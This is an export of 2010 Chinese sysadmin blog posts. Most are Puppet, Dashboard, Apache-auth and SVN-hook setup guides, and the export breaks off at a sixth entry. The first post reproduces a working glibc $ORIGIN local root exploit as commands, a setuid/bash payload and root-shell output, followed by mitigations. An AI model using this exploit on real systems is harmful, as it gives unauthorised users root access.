[
  {
    "id": 0,
    "title": "linux gcc++漏洞：普通用户获得root权限",
    "category": "其它",
    "tags": [
      "linux漏洞",
      "root权限"
    ],
    "url": "/archives/linux-gcc%E6%BC%8F%E6%B4%9E%EF%BC%9A%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E8%8E%B7%E5%BE%97root%E6%9D%83%E9%99%90/",
    "content": "<p><strong>前言：经我测试在RHEL5 / CentOS5 / FC13都成功了。</strong></p>\n\n<p>首先介绍下一下具体步骤中涉及到的2个频繁的出现的词语:</p>\n\n<p>taviso:作者 Tavis Ormandy 的简称，<a href=\"http://www.wohuia.com/Topic/3554851\" target=\"_blank\">Google</a>信息安全工程师 个人微博：http://my.opera.com/taviso/blog/   <a rel=\"nofollow\" href=\"http://twitter.com/taviso\">http://twitter.com/taviso</a>\n<strong>exploit：</strong>自己创建的目录，表意漏洞利用，可以取任何名字。<!--more--></p>\n\n<p>原理：<strong>The GNU C library dynamic linker expands $ORIGIN in setuid library search path  详见作者博客</strong>\n<img title=\"更多...\" src=\"http://64.120.134.162/wp-includes/js/tinymce/plugins/wordpress/img/trans.gif\" alt=\"\" />\n[cc lang='abap' ]\n$ mkdir /tmp/exploit</p>\n\n<p>$ ln /bin/ping /tmp/exploit/target</p>\n\n<p>$ exec 3&lt; /tmp/exploit/target</p>\n\n<p>$ ls -l /proc/$$/fd/3\nlr-x------ 1 taviso taviso 64 Oct 15 09:21 /proc/10836/fd/3 -&gt; /tmp/exploit/target*</p>\n\n<p>$ rm -rf /tmp/exploit/</p>\n\n<p>$ ls -l /proc/$$/fd/3\nlr-x------ 1 taviso taviso 64 Oct 15 09:21 /proc/10836/fd/3 -&gt; /tmp/exploit/target (deleted)</p>\n\n<p>$ cat &gt; payload.c\nvoid __attribute__((constructor)) init()\n{\n    setuid(0);\n    system(\"/bin/bash\");\n}\n^D\n$ gcc -w -fPIC -shared -o /tmp/exploit payload.c\n$ ls -l /tmp/exploit\n-rwxrwx--- 1 taviso taviso 4.2K Oct 15 09:22 /tmp/exploit*</p>\n\n<p>$ LD_AUDIT=\"$ORIGIN\" exec /proc/self/fd/3\nsh-4.1# whoami\nroot\nsh-4.1# id\nuid=0(root) gid=500(taviso)\n[/cc]</p>\n\n<p>看到了吧！是不是很恐怖。以下有2种解决办法：</p>\n\n<p><strong>1，绑定目录</strong></p>\n\n<p><strong>需要理解一下nosuid的原理：<span id=\"__end\"><span style=\"font-family: Arial; color: #0000ff; font-size: x-small;\"><strong></strong></span></span></strong>\n我的理解是：比如/etc/passwd这个文件，本来只有root有权限修改，但是用户本身也可以去修改自己的密码，这就是一种“超出它本身权限的行为”，\nnosuid就是为了停止这种提升特权的办法。比如/tmp目录就有这样的权限，我们就需要对它控制。\n[cc lang='abap' ]\n# mount -o bind /tmp /tmp\n# mount -o remount,bind,nosuid /tmp /tmp\n\n[/cc]\n<strong>2，升级glibc版本（红帽官方提供的解决办法）</strong>\n[cc lang='abap' ]\n#yum update  glibc\n[/cc]</p>\n",
    "date": {
      "year": "2010",
      "month": "November",
      "day": "01"
    }
  },
  {
    "id": 1,
    "title": "开源自动化配置管理工具Puppet安装",
    "category": "puppet",
    "tags": [
      "puppet",
      "安装",
      "证书"
    ],
    "url": "/archives/%E5%BC%80%E6%BA%90%E8%87%AA%E5%8A%A8%E5%8C%96%E9%85%8D%E7%BD%AE%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7puppet%E5%AE%89%E8%A3%85/",
    "content": "<p><p>Puppet是一款开源的工具，使用自有的puppet描述语言，可管理配置文件、用户、cron任务、软件包、系统服务等。可以被其他人利用，而忽略公司差异，实现了自动化部署。<!--more--><strong>环境：</strong></p>\n<p>系统：centos5.5 </p>\n<p>\n\t<!--more--><strong>1 首先安装企业Linux（EPEL）yum的仓库的额外的软件包：</strong></p>\n<p>#rpm &ndash;Uvh http://download.fedora.redhat.com/pub/epel/5/x86_64/epel-release-5-4.noarch.rpm</p>\n<p><strong>2 安装centos需要的软件包：</strong></p>\n<p>#yum install -y mysql mysql-devel mysql-server ruby ruby-devel ruby-irb ruby-mysql ruby-rdoc ruby-ri</p>\n<p>我安装的版本是ruby1.8.5 ，不要安装1.87以上的版本，puppet还不支持。</p>\n<p>mysql可以使用自己编译安装的</p>\n<p><strong>3 启动mysql：</strong></p>\n<p>#service mysqld start</p>\n<p>#chkconfig mysqld on</p>\n<p><strong>4 下载最近版本的puppet，我用的是编译安装，所以需要先安装facter：</strong></p>\n<p><span style=\"background-color: rgb(255, 0, 0);\">注</span>：它的作用是收集主机的一些资料，比如CPU，主机IP等，facter把收集到值发送给puppet服务器端,服务器端就可以根据不同的条件来对不同的节点机器生成不同的puppet配置文件</p>\n<p>#wget http://puppetlabs.com/downloads/facter/facter-latest.tgz</p>\n<p># tar zxvf facter-latest.tgz</p>\n<p># cd facter-1.5.8</p>\n<p># /usr/local/bin/ruby install.rb</p>\n<p><strong>5 下载安装puppet主程序\n\t</strong></p>\n<p># wget http://puppetlabs.com/downloads/puppet/puppet-2.6.3.tar.gz</p>\n<p># tar zxvf puppet-2.6.3.tar.gz</p>\n<p># cd puppet-2.6.3</p>\n<p># /usr/local/bin/ruby install.rb</p>\n<p><strong>6 修改hosts文件</strong></p>\n<p>server端</p>\n<p>127.0.0.1 localhost.localdomain localhost<span style=\"background-color: rgb(255, 255, 0);\"> puppet</span></p>\n<p>192.168.8.56&nbsp;&nbsp;&nbsp; client.dongwm.com</p>\n<p>client端</p>\n<p>192.168.8.200&nbsp;&nbsp; puppet</p>\n<p><strong>7 Server端安装与配置</strong></p>\n<p><strong>1 拷贝源文件</strong></p>\n<p>#mkdir /etc/puppet\n\t#cp conf/auth.conf /etc/puppet/\n\t#cp conf/redhat/fileserver.conf /etc/puppet/\n\t#cp conf/redhat/puppet.conf /etc/puppet/\n\t#cp conf/redhat/server.init /etc/init.d/puppetmaster\n\t#chmod +x /etc/init.d/puppetmaster\n\t#chkconfig &ndash;add puppetmaster\n\t#chkconfig puppetmaster on\n\t#mkdir -p /etc/puppet/manifests</p>\n<p><strong>2 创建puppet帐号</strong>\n\t# puppetmasterd &ndash;mkusers（执行中可能会出一些错误，基本上以前安装或创建过puppet用户的原因，执行就是让它自动去 /var/lib/puppet下创建一些目录）</p>\n<p>#mkdir /var/lib/puppet/rrd &amp;&amp; chown puppet.puppet /var/lib/puppet/rrd</p>\n<p>\n\t<strong>3修改主机名（需要fqdn格式）</strong></p>\n<p>#hostname master.dongwm.com</p>\n<p># vi /etc/sysconfig/network</p>\n<p>修改为：HOSTNAME=master.dongwm.com</p>\n<p><strong>4启动服务</strong></p>\n<p>*第一次启动时puppet会自动创建所需的文件，包括一系列证书文件等</p>\n<p>我建议使用DEBUG模式，可以看见启动过程：</p>\n<p>puppetmasterd -d &ndash;no-daemonize -v &ndash;trace</p>\n<p><strong>8 Client端配置</strong></p>\n<p>编译安装同server端</p>\n<p><strong>1 复制配置文件</strong>\n\t#mkdir /etc/puppet\n\t#cp conf/auth.conf /etc/puppet/\n\t#cp conf/namespaceauth.conf /etc/puppet/\n\t#cp conf/redhat/puppet.conf /etc/puppet/\n\t#cp conf/redhat/client.init /etc/init.d/puppet\n\t#chmod +x /etc/init.d/puppet\n\t#chkconfig &ndash;add puppet\n\t#chkconfig puppet on</p>\n<p><strong>2 创建puppet帐号</strong>\n\t# puppetd &ndash;mkusers</p>\n<p>#mkdir &ndash;r /var/lib/puppet/rrd &amp;&amp;chown puppet.puppet /var/lib/puppet/rrd</p>\n<p><strong>3 修改主机名</strong>\n\t# hostname client.dongwm.com\n\t# vi /etc/sysconfig/network\n\t修改\n\tHOSTNAME=client.dongwm.com</p>\n<p><strong>4 启动服务</strong></p>\n<p>/etc/init.d/puppet start</p>\n<p>注：当启动puppet时，程序会根据puppet.conf中的配置自动向服务端发起证书验证请求。</p>\n<p>puppet.conf的详细完整内容可以使用&ldquo;puppet &ndash;genconfig | less&rdquo;(master端使用puppetmasterd &ndash;genconfig | less)\n\t命令详细查看</p>\n<p>签名证书</p>\n<p>我们在server端查看等待确认的证书：</p>\n<p>#puppetca &ndash;list</p>\n<p>client.okooo.com</p>\n<p><strong>5 全部认证：</strong></p>\n<p>#puppetca -s -a\n\t<span style=\"background-color: rgb(255, 0, 0);\">注</span>：也可以在master端的puppet.conf加这样一行：</p>\n<p>autosign = true</p>\n<p>这样就会自动签证书了。</p>\n<p><strong>\n\t客户端再请求一次：</strong></p>\n<p>#puppetd &ndash;test &ndash;server master.dongwm.com</p>\n<p>err: Could not retrieve catalog from remote server: certificate verify failed</p>\n<p>这是时间不同步的问题：</p>\n<p>同步一下时间（两端都执行）：</p>\n<p>#/usr/sbin/ntpdate time.nist.gov</p>\n<p>删除/var/lib/puppet/ssl目录下的文件（或者在/etc/puppet/ssl），重新请求。</p>\n<p>OK这次出现的正确的：</p>\n<p>info: Caching certificate for client.dongwm.com</p>\n<p>info: Caching certificate_revocation_list for ca</p>\n<p>info: Caching catalog for client.dongwm.com</p>\n<p>info: Applying configuration version &rsquo;1290862961&prime;</p>\n<p>info: Creating state file /var/lib/puppet/state/state.yaml</p>\n<p>安装成功！</p>\n<p><strong>FAQ：\n\t</strong></p>\n<p>&nbsp;安装过程中能够成功签收证书需要注意的是一定要修改一下配置：</p>\n<p>1 # hostname client.dongwm.com</p>\n<p>2 # vi /etc/sysconfig/network</p>\n<p>3#&nbsp; vi /etc/hosts</p>\n</p>\n",
    "date": {
      "year": "2010",
      "month": "November",
      "day": "23"
    }
  },
  {
    "id": 2,
    "title": "Puppet Dashboard配置文档",
    "category": "puppet",
    "tags": [
      "Dashboard",
      "puppet",
      "report"
    ],
    "url": "/archives/puppet-dashboard%E9%85%8D%E7%BD%AE%E6%96%87%E6%A1%A3/",
    "content": "<p>前言：为了在webGUI上面管理puppet，查看report信息，可以使用puppet项目组推出的dashboard面板。<!--more-->\n配置前准备：\n1 确认ruby版本（官方要求的版本1.8.4到1.8.7）：\n#ruby -v\nruby 1.8.5 (2006-08-25) [x86_64-linux]\n注：后面会安装rake，它会提示我们的ruby版本要&gt;1.8.6（本文主要针对编译安装，对于yum安装直接yum  install rubygems即可）\n如果不升级，安装的rubygem的版本要低于1.3.1.\n<code>#rpm -Uvh http://download.fedora.redhat.com/pub/epel/5/x86_64/epel-release-5-4.noarch.rpm\n#rpm -Uvh http://download.elff.bravenet.com/5/x86_64/elff-release-5-3.noarch.rpm\n#yum install ruby ruby-shadow ruby-ri ruby-rdoc gcc gcc-c++ ruby-devel -y</code>\n现在：\n# ruby -v\nruby 1.8.6 (2010-02-05 patchlevel 399) [x86_64-linux]\n3 安装 mysql-devel和 ruby-mysql（ruby-masql也可以 使用gem install mysql安装）\n#yum install ruby-mysql mysql-devel mysql mysql-server\n3 启动mysql：\n#service mysqld start\n#chkconfig mysqld on\n4 安装GEM软件包安装器\n#wget http://production.cf.rubygems.org/rubygems/rubygems-1.3.5.tgz\n注：1.3.5版本以上和centos5.5不兼容。\n# tar zxvf rubygems-1.3.5.tgz\n# cd rubygems-1.3.5\n# ruby setup.rb\n5 安装rake\n#gem install rake\n显示如下：\nSuccessfully installed rake-0.8.7\n1 gem installed\nInstalling ri documentation for rake-0.8.7...\nInstalling RDoc documentation for rake-0.8.7...\n下载安装Dashboard：\n#wget <a href=\"http://puppetlabs.com/downloads/dashboard/puppet-dashboard-1.0.4.tgz\">http://puppetlabs.com/downloads/dashboard/puppet-dashboard-1.0.4.tgz</a>\n#tar zxvf puppet-dashboard-1.0.4.tgz –C  /usr/local/puppet-dashboard\n给mysql创建一个mysql数据库，并且指定用户给puppet\n创建一个软连接（根据个人配置）：\n#ln -s /tmp/mysql.sock /var/lib/mysql/mysql.sock\n[ccine_perl]#mysql\nmysql&gt; create database dashboard default charset utf8;\nQuery OK, 1 row affected (0.00 sec)\nmysql&gt; use dashboard\nDatabase changed\nmysql&gt; grant all on dashboard.* to dashboard@localhost identified by 'dashboard' ;\nQuery OK, 0 rows affected (0.02 sec)\nmysql&gt; flush privileges;\nQuery OK, 0 rows affected (0.00 sec)[/ccine_perl]\n下面的重点：先进入面板的安装目录，在进行下面的操作：\n#cd /usr/local/puppet-dashboard\n给面板建立一个数据库的Yml文件，因为有默认的database.yml.example 复制一下。\n# cp config/database.yml.example config/database.yml\n修改database.yml，我们使用生产环境，所以在以下位置修改：\n[ccine_perl]production:\ndatabase: dashboard\nusername: dashboard\npassword: dashboard\nencoding: utf8\nadapter: mysql[/ccine_perl]\n使用rake任务创建刚从在config / database.yml文件设置的数据库\n# rake RAILS_ENV=production db:create\n出现如下：\n(in /usr/local/puppet-dashboard)\n!!! The bundled mysql.rb driver has been removed from Rails 2.2. Please install the mysql gem and try again: gem install mysql.\nrake aborted!\nno such file to load – mysql（没有安装mysql的问题，下面执行前确保先安装mysql－devel）\n# gem install mysql\n# rake RAILS_ENV=production db:migrate（为典型的生产环境配置）</p>\n\n<p>Ok 可以启动了！\n这个面板是自带web的，所以不需要apache支持（和apache结合看后来的文章）\n# script/server -p 3100 －d （“－d”表示后台运行）\n假设我们使用3100端口（默认3000）</p>\n\n<p>Web报告功能：</p>\n\n<p>1  首先在master端新增一个配置文件：\n# vi /etc/puppet/manifests/site.pp\n添加以下内容：\n[ccine_perl]# Create /tmp/testfile\nclass test_class {\nfile {\n\"/tmp/testfile\":\nname =&gt; \"/tmp/testfile\",\nmode =&gt; 666,\nowner =&gt; root,\ngroup =&gt; root;\n}\n}\n# tell puppet on which client to run the class\nnode 'client.dongwm.com' {\ninclude test_class\n}[/ccine_perl]</p>\n\n<p>Server端配置：</p>\n\n<p>注：yum安装puppet的版本号是0.25.X，编译安装的版本号是2.6.X，配置略有不同请注意\n# puppetmasterd --configprint libdir</p>\n\n<p># vi /etc/puppet/puppet.conf\n在【main】添加以下内容：\nreports = http, store\n启动puppetmaster\n/etc/init.d/puppetmaster restart</p>\n\n<p>client端配置：\n# vi /etc/puppet/puppet.conf\n在【agent】添加以下内容：\nreport = true</p>\n\n<p>启动puppet：\n/etc/init.d/puppet restart</p>\n\n<p>在web面板里面添加我们配置的node</p>\n\n<p>点击 左中的add class\n添加test_class（上面的site.pp已定义）\n<img title=\"puppet1\" src=\"http://farm6.static.flickr.com/5042/5212915089_2187bed67c_m.jpg\" alt=\"\" width=\"240\" height=\"131\" /></p>\n\n<p>点击创建！\n点击左中的add group</p>\n\n<p>添加root组：\n<img title=\"puppet2\" src=\"http://farm6.static.flickr.com/5126/5213511620_41564e529e_m.jpg\" alt=\"\" width=\"240\" height=\"204\" />\n点击创建</p>\n\n<p>最后增加node，点开左中的add node</p>\n\n<p>增加client.dongwm.com 这个node\n<img title=\"puppet3\" src=\"http://farm6.static.flickr.com/5287/5213512034_3067298e97_m.jpg\" alt=\"\" width=\"240\" height=\"192\" /></p>\n\n<p>找到puppetmaster的lib目录\n#puppetmasterd --configprint libdir\n/var/lib/puppet/lib</p>\n\n<p>#mkdir –p  /var/lib/puppet/lib/puppet/reports/\n#cp ext/puppet/puppet_dashboard.rb /var/lib/puppet/lib/puppet/reports/\n#/var/lib/puppet/lib/puppet/reports/puppet_dashboard.rb\n导入现有的报告\n#rake RAILS_ENV=production reports:import /var/lib/puppet/lib/puppet/reports/\n以下是成功后的界面：\n<img title=\"puppet4\" src=\"http://farm6.static.flickr.com/5283/5212916269_66c26dc268_m.jpg\" alt=\"\" width=\"240\" height=\"122\" /></p>\n",
    "date": {
      "year": "2010",
      "month": "November",
      "day": "24"
    }
  },
  {
    "id": 3,
    "title": "puppet-dashboard的基于.htaccess验证",
    "category": "puppet",
    "tags": [
      ".htaccess",
      "验证"
    ],
    "url": "/archives/puppet-dashboard%E7%9A%84%E5%9F%BA%E4%BA%8E-htaccess%E9%AA%8C%E8%AF%81/",
    "content": "<p><div /></p>\n\n<p>由于<a title=\"puppet\" href=\"http://64.120.134.162/puppet-4\">puppet</a>使用自己系统的web前端，并且目前还不支持密码验证机制，直接使用http://IP:port模式登陆，这就造成了很大的安全隐患。所以我将其与Apache结合（Nginx方法类似），实现了和<a title=\"nagios\" href=\"http://64.120.134.162/%e7%b3%bb%e7%bb%9f%e7%9b%91%e6%8e%a7/nagios-2\">nagios</a>一样的密码验证机制。<!--more--><img title=\"更多...\" src=\"http://64.120.134.162/wp-includes/js/tinymce/plugins/wordpress/img/trans.gif\" alt=\"trans puppet dashboard基于.htaccess验证puppet dashboard基于.htaccess验证\" /><img title=\"更多...\" src=\"http://64.120.134.162/wp-includes/js/tinymce/plugins/wordpress/img/trans.gif\" alt=\"\" /></p>\n\n<p>本文假设已经搭建好dashboard环境。</p>\n\n<p>确认版本： <a title=\"Puppet\" href=\"http://64.120.134.162/archives/category/puppet\">Puppet</a> (&gt;0.24.6)；否则不支持.htaccess验证</p>\n\n<p>首先需要了解一下概念</p>\n\n<p>Passenger 又名mod_rails或mod_rack，是Apache    2.x的扩展，允许你运行Apache的Rails或者rack的应用。目前最新版本是3.0.0,不同的操作系统和版本都可能有    一些未知的问题，所以使用了稳定版本2.2.11（不要超过2.2.15）</p>\n\n<p># gem install -v=2.2.11 passenger</p>\n\n<p>Rack 官网的介绍：a Ruby Webserver Interface 如果使用gem安装默认版本是0.8.7,我安装的是1.01</p>\n\n<p><strong>1 </strong><strong>在master端puppet. conf添加以下语句</strong></p>\n\n<p>[ccine_perl][main]</p>\n\n<p>ssl_client_header = SSL_CLIENT_S_DN</p>\n\n<p>ssl_client_verify_header = SSL_CLIENT_VERIFY[/ccine_perl]</p>\n\n<p>重启puppet</p>\n\n<p>#/etc/init.d/puppetmaster restart</p>\n\n<p><strong>2 </strong><strong>安装Apache, Rack and Passenger（假设存在apache不必安装，由于我自己编译了apache，rubygems和ruby所以只安装Rack and Passenger）</strong></p>\n\n<p># yum install httpd httpd-devel ruby-devel rubygems</p>\n\n<p>#gem install -v=2.2.11 passenger</p>\n\n<p># gem install -v=1.0.1 rack</p>\n\n<p><strong>3 </strong><strong>安装passenger-install-apache2-module模块</strong></p>\n\n<p>#passenger-install-apache2-module</p>\n\n<p>注：nginx有passenger-install-nginx-module模块，默认passenger启动使用nginx。</p>\n\n<p>技巧：安装rack如果安装0。87版本，现不要安装，在安装模块时会检测没有rake，根据他的提示安装即1.0.1版本。</p>\n\n<p>选择菜单中2步回车即可。注意以下信息：</p>\n\n<p>LoadModule passenger_module /usr/lib64/ruby/gems/1.8/gems/passenger-2.2.11/ext/apache2/mod_passenger.so</p>\n\n<p>PassengerRoot /usr/lib64/ruby/gems/1.8/gems/passenger-2.2.11</p>\n\n<p>PassengerRuby /usr/bin/ruby</p>\n\n<p>等一下将其复制到虚拟主机的配置文件中。</p>\n\n<p><strong>4 </strong><strong>安装 Apache 模块mod_ssl</strong></p>\n\n<p>#yum install mod_ssl\n<div /></p>\n\n<p><strong>5 </strong><strong>编辑config.ru文件</strong></p>\n\n<p>#vi /你的puppet-dashboard安装根目录/config.ru</p>\n\n<p>修改成一下内容：</p>\n\n<p>[ccine_perl]$0 = \"puppetmasterd\"\nARGV &lt;&lt; \"--debug\"\nrequire 'puppet'\nARGV &lt;&lt; \"--rack\"\nrequire 'puppet/application/master'\nrun Puppet::Application[:master].run[/ccine_perl]\n注意修改文件权限：</p>\n\n<p>#chown puppet /你的puppet-dashboard安装根目录/config.ru</p>\n\n<p><strong>6 </strong><strong>编辑虚拟主机配置文件</strong></p>\n\n<p>#vi /opt/apache/conf.d/puppetmaster.conf</p>\n\n<p>修改为以下内容：</p>\n\n<p>[ccine_perl]LoadModule passenger_module /usr/lib64/ruby/gems/1.8/gems/passenger-2.2.11/ext/apache2/mod_passenger.so</p>\n\n<p>PassengerRoot /usr/lib64/ruby/gems/1.8/gems/passenger-2.2.11</p>\n\n<p>PassengerRuby /usr/bin/ruby</p>\n\n<p>PassengerHighPerformance on\nPassengerMaxPoolSize 12\nPassengerPoolIdleTime 1500\nPassengerMaxRequests 2000\nPassengerStatThrottleRate 120\nRackAutoDetect Off\nRailsAutoDetect Off</p>\n\n<p>Listen 8140</p>\n\n<p>&lt;VirtualHost *:8140&gt;</p>\n\n<p>ServerName server.dongwm.com</p>\n\n<p>SSLEngine on\nSSLProtocol -ALL +SSLv3 +TLSv1\nSSLCipherSuite ALL:!ADH:RC4+RSA:+HIGH:+MEDIUM:-LOW:-SSLv2:-EXP</p>\n\n<p>SSLCertificateFile      /var/lib/puppet/ssl/certs/server.dongwm.com.pem\nSSLCertificateKeyFile   /var/lib/puppet/ssl/private_keys/server.dongwm.com.pem\nSSLCertificateChainFile /var/lib/puppet/ssl/ca/ca_crt.pem\nSSLCACertificateFile    /var/lib/puppet/ssl/ca/ca_crt.pem</p>\n\n<p>SSLCARevocationFile     /var/lib/puppet/ssl/ca/ca_crl.pem\nSSLVerifyClient optional\nSSLVerifyDepth  1\nSSLOptions +StdEnvVars</p>\n\n<p>DocumentRoot /你的puppet-dashboard安装根目录/public/</p>\n\n<p>&lt;Directory /你的puppet-dashboard安装根目录/public&gt;</p>\n\n<p>Options None</p>\n\n<p>AllowOverride   AuthConfig</p>\n\n<p>Order allow,deny</p>\n\n<p>allow from all</p>\n\n<p>&lt;/Directory&gt;</p>\n\n<p>ErrorLog /var/log/httpd/dashboard.error.log</p>\n\n<p>LogLevel warn</p>\n\n<p>CustomLog /var/log/httpd/dashboard.access.log combined</p>\n\n<p>&lt;/VirtualHost&gt;[/ccine_perl]</p>\n\n<p><strong>7 </strong><strong>创建密码文件</strong></p>\n\n<p>#htpasswd -c /opt/htpasswd.users dashboard（文件路径和用户名根据自己习惯，但是下面的.htaccess文件会用到。创建文件加 ‘c’选项）</p>\n\n<p><strong>8 </strong><strong>在puppet-dashboard主目录下创建.htaccess</strong></p>\n\n<p>添加内容：</p>\n\n<p>[ccine_perl]AuthType Basic</p>\n\n<p>AuthName “This is for puppete”</p>\n\n<p>AuthUserFile “/opt/htpasswd.users ”</p>\n\n<p>Require User dashboard      # 也可以写成require valid-user只要是文件中定义过的用户那么就可以访问这个目录[/ccine_perl]</p>\n\n<p><strong>9 </strong><strong>测试httpd.conf文件</strong></p>\n\n<p>#httpd -t</p>\n\n<p>#httpd –S</p>\n\n<p><strong>10 </strong><strong>重新加载配置文件</strong></p>\n\n<p>service httpd reload</p>\n\n<p>\n</p>\n",
    "date": {
      "year": "2010",
      "month": "November",
      "day": "29"
    }
  },
  {
    "id": 4,
    "title": "使用svn和hook（钩子）对puppet进行版本控制",
    "category": "puppet",
    "tags": [
      "hook",
      "svn",
      "版本控制",
      "钩子"
    ],
    "url": "/archives/%E4%BD%BF%E7%94%A8svn%E5%92%8Chook%EF%BC%88%E9%92%A9%E5%AD%90%EF%BC%89%E5%AF%B9puppet%E8%BF%9B%E8%A1%8C%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6/",
    "content": "<p>puppet默认没有使用版本控制。可以在puppet.conf文件中添加一下一行：\n<code>config_version = /usr/local/bin/return_version</code>\n其中“/usr/local/bin/return_version” 是我自定义的脚本：<!--more--></p>\n\n<p>[ccine_perl height=\"100%\" width=\"99%\"]#!/bin/bash</p>\n\n<p>date +%Y%m%d%H[/ccine_perl]</p>\n\n<p>so 简单 ^.^</p>\n\n<p>puppet的这个版本号是用于与client端通信的信息，可以使用tagmail或者puppet的report功能，在基于webUI的dashboard或者foreman方便查阅自动化情况，通过时间判断是一个不错的办法。</p>\n\n<p>svn的版本控制主要是对puppet部署的配置文件的控制，对于传送文件，使用exec执行客户端命令等操作不能进行回滚操作，需要自定义回滚方法（svn只负责svn服务器本地版本库内的文件系统）</p>\n\n<p>1 安装svn</p>\n\n<p>我使用yum安装：</p>\n\n<p>#yum  install subversion mod_dav_svn mod_auth_mysql –y</p>\n\n<p>2 确认是否已安装一下安装包：</p>\n\n<p>openssl-XXX</p>\n\n<p>openssl-devel-XXX</p>\n\n<p>mod_ssl-XXX</p>\n\n<p>mod_auth_mysql-XXX</p>\n\n<p>subversion-XXX</p>\n\n<p>mod_dav_svn-XXX</p>\n\n<p>3 确认模块：</p>\n\n<p>在/etc/httpd/modules（根据你的apache安装目录）</p>\n\n<p>mod_authz_svn.so</p>\n\n<p>mod_dav_svn.so</p>\n\n<p>mod_auth_mysql.so</p>\n\n<p>4 建立并创建svn版本库</p>\n\n<p>#mkdir –p /opt/svn/puppet</p>\n\n<p>#svnadmin create /opt/svn/puppet</p>\n\n<p>5 修改SVN配置文件</p>\n\n<p>#vi /opt/svn/puppet/conf/svnserve.conf(操作权限文件指定)</p>\n\n<p>[ccine_perl height=\"100%\" width=\"99%\"][general]</p>\n\n<p>auth-access = write</p>\n\n<p>password-db = passwd</p>\n\n<p>authz-db = authz</p>\n\n<p>realm = puppet[/ccine_perl]</p>\n\n<p>#vi /opt/svn/puppet/conf/password（容许访问SVN的用户及密码）</p>\n\n<p>[ccine_perl height=\"100%\" width=\"99%\"][users]</p>\n\n<p>puppet = <a href=\"mailto:Ry0va@g4zPbn\">testpassword</a>[/ccine_perl]</p>\n\n<p>#vi /opt/svn/puppet/conf/authz(用户对某目录及自动目录的访问权限，下面表示admin组对svn所有目录都有读写权限)</p>\n\n<p>[ccine_perl height=\"100%\" width=\"99%\"][groups]</p>\n\n<p>admin = puppet</p>\n\n<p>[/]</p>\n\n<p>@admin = rw[/ccine_perl]</p>\n\n<p>6 启动svn</p>\n\n<p>#svnserve -d –r /opt/svn/</p>\n\n<p>7向版本库提交资源，我设置的路径是puppet模块的主目录(原因见下面的说明，默认为/etc/puppet,我指定到了其他路径,puppet.conf中指定）</p>\n\n<p>#svn import –m “test” /usr/share/svn/modules  <a>file:///opt/svn/puppet</a></p>\n\n<p>8 svn还是需要系统学习的，这里只是一个开端，，为了让大家尽快懂得svn，下面介绍一些会用到的命令包括：</p>\n\n<p>svn add * （将新修改的配置以及新添加的文件纳入版本控制，这是在修改量大的情况下，最简单快速的办法）</p>\n\n<p>svn commit -m \"一些更新信息\" （将新修改的配置提交到版本库）</p>\n\n<p>svn co file:///home/okooo/apps/svn/puppet tmp（将版本库的内容拷贝一个副本到这次操作的目录下的tmp目录-这个都可以定义，默认就是版本库的名字，本例中是puppet）</p>\n\n<p>svn up （下载一份完整的版本库内容到操作的目录下）</p>\n\n<p>svn cleanup （有些时候在别人修改时候文件被锁定等原因，运行这个命令可以解除锁定）</p>\n\n<p>svn del manifests/node/java.pp（将版本库的某些内容删除，这里是删除java.pp，然后svn commit就会成功删除）</p>\n\n<p>svn diff manifests/node/java.pp （将修改后的java.pp文件和版本库的同名文件对比不同的内容）</p>\n\n<p>svn log （查看更新内容的日志，这个log显示出来的就是上面执行“svn commit -m” 后的内容）</p>\n\n<p>....</p>\n\n<p>因为我们不涉及开发维护，所以svn不需要太熟，但是还是建议掌握所有内容</p>\n\n<p><strong>SVN的hooks</strong></p>\n\n<p><strong> </strong></p>\n\n<p>钩子的功能其实我也迷糊了很久，我的理解就是在版本库出现修改时被触发的自定义脚本，这样可以确定很多属性：比如Pre-Commit钩子的作用是代码提交前是否有写messages，是否有tab，是否有不允许上传的文件，是否有超过限制大小的文件等等，这样可以控制一些不合适的提交。</p>\n\n<p>以下是一个Pre-Commit钩子，用于检查语法错误：</p>\n\n<p>检查puppet的.pp配置文件是否有问题，也可以执行：</p>\n\n<p>puppet －v  你的主要配置文件site.pp\n[ccine_perl height=\"100%\" width=\"99%\"]<code>#!/bin/sh\n# SVN pre-commit hook to check Puppet syntax for .pp files\n# Modified from http://mail.madstop.com/pipermail/puppet-users/2007-March/002034.html\nREPOS=\"$1\"\nTXN=\"$2\"\ntmpfile=`mktemp`\nexport HOME=/\nSVNLOOK=/usr/bin/svnlook\n$SVNLOOK changed -t \"$TXN\" \"$REPOS\" | awk '/^[^D].*\\.pp$/ {print $2}' | while read line\ndo\n    $SVNLOOK cat -t \"$TXN\" \"$REPOS\" \"$line\" &gt; $tmpfile\n    if [ $? -ne 0 ]\n    then\n        echo \"Warning: Failed to checkout $line\" &gt;&amp;2\n    fi\n    puppet --color=false --confdir=/etc/puppet --vardir=/var/lib/puppet --parseonly --ignoreimport $tmpfile &gt;&amp;2\n    if [ $? -ne 0 ]\n    then\n        echo \"Puppet syntax error in $line.\" &gt;&amp;2\n        exit 2\n    fi\ndone\nres=$?\nrm -f $tmpfile\nif [ $res -ne 0 ]\nthen\n    exit $res\nfi</code>[/ccine_perl]</p>\n",
    "date": {
      "year": "2010",
      "month": "November",
      "day": "30"
    }
  },
  {
    "id": 5,
    "title": "Nagios深入进阶之一：被动检查",
    "category": "nagios",
    "tags": [
      "nagios",
      "nsca",
      "被动检查"
    ],
    "url": "/archives/nagios%E6%B7%B1%E5%85%A5%E8%BF%9B%E9%98%B6%E4%B9%8B%E4%B8%80%EF%BC%9A%E8%A2%AB%E5%8A%A8%E6%A3%80%E6%9F%A5/",
